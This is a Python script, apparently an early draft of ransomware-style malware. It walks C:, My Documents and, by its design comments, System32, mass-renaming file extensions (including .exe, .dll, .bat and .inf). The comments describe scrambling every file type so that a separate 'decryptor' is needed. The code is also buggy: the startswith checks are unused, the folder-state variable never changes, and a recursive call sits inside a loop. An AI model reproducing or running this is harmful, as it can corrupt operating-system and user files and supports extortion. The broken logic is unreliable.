from os import rename, listdir
import os
import os.path
#home = expanduser("~") #gets you to the home directory.
folds = 0
def dirDesktop():
	folds = 1
	os.chdir("C:")
	DesktopInf();
def dirCDrive():
	folds = 2
	os.chdir("C:\\My Documents")
	DesktopInf();
def dirSys32():
	folds = 3
	os.chdir("C:\\Windows\\System32")
def DesktopInf():
	fnames = listdir('.')
	for fname in fnames:
		pref = ".kys"
		print (fname)
		fname.startswith(pref)
		os.rename(fname, fname.replace(pref, '.txt', 1))
		pass
	fnames = listdir('.')
	for fname in fnames:
		print (fname)
		pref = ".Nope"
		fname.startswith(pref)
		os.rename(fname, fname.replace(pref, '.png', 1))
		pass
	fnames = listdir('.')
	for fname in fnames:
		print (fname)
		pref = ".hahz"
		fname.startswith(pref)
		os.rename(fname, fname.replace(pref, '.jpg', 1))
		pass
	fnames = listdir('.')
	for fname in fnames: # this is a test to see if it works correctly, nvm again
		print(fname)
		pref = ".text"
		fname.startswith(pref)
		os.rename(fname, fname.replace(pref, '.exe', 1))
		pass
	fnames = listdir('.')
	for fname in fnames:
		print (fname)
		pref = ".uppt"
		fname.startswith(pref)
		os.rename(fname, fname.replace(pref, '.pdf', 1))
		pass
	fnames = listdir('.')
	for fname in fnames:
		print(fname)
		pref = ".help"
		fname.startswith(pref)
		os.rename(fname, fname.replace(pref, '.doc', 1))
		pass
	fnames = listdir('.')
	for fname in fnames:
		print(fname)
		pref = ".send"
		fname.startswith(pref)
		os.rename(fname, fname.replace(pref, '.dll', 1))
		pass
	fnames = listdir('.')
	for fname in fnames:
		print(fname)
		pref = ".haz"
		fname.startswith(pref)
		os.rename(fname, fname.replace(pref, '.xml', 1))
		pass
	fnames = listdir('.')
	for fname in fnames:
		print (fname)
		pref = ".han"
		fname.startswith(pref)
		os.rename(fname, fname.replace(pref, '.bat', 1))
		pass
	fnames = listdir('.')
	for fname in fnames:
		print(fname)
		pref = ".negative"
		fname.startswith(pref)
		os.rename(fname, fname.replace(pref, '.vbs', 1))
		pass
	fnames = listdir('.')
	for fname in fnames:
		print (fname)
		pref = ".lentro"
		fname.startswith(pref)
		os.rename(fname, fname.replace(pref, '.py', 1))
		pass
	fnames = listdir('.')
	for fname in fnames:
		print (fname)
		pref = ".Data"
		fname.startswith(pref)
		os.rename(fname, fname.replace(pref, '.dbx', 1))
		pass
	fnames = listdir('.')
	for fname in fnames:
		print (fname)
		pref = ".wex"
		fname.startswith(pref)
		os.rename(fname, fname.replace(pref, '.html', 1))
		pass
	fnames = listdir('.')
	for fname in fnames:
		print (fname)
		pref = ".washington"
		fname.startswith(pref)
		os.rename(fname, fname.replace(pref, '.inf', 1))
		pass
	fnames = listdir('.')
	for fname in fnames:
		print (fname)
		pref = ".car"
		fname.startswith(pref)
		os.rename(fname, fname.replace(pref, '.rar', 1))
		pass
	fnames = listdir('.')
	for fname in fnames:
		print (fname)
		pref = ".wazup"
		fname.startswith(pref)
		os.rename(fname, fname.replace(pref, '.ppt', 1))
		pass
		fnames = listdir('.')
		dirCDrive();
		

if folds == 0: #Have to test later but this should be a way to go to each new directory
	dirDesktop();
elif folds == 1:
	dirCDrive();
elif folds == 2:
	dirSys32();


#make a directory to change the Sys32 and their documents etc. all files
#each variety of file will have a different extension to change to, so that I can make a decryptor 
#Maybe give something like the text file extension randomized so instead of just .kys it can also be .locke or something like that. Note that this will make more work for me when making a decryptor...
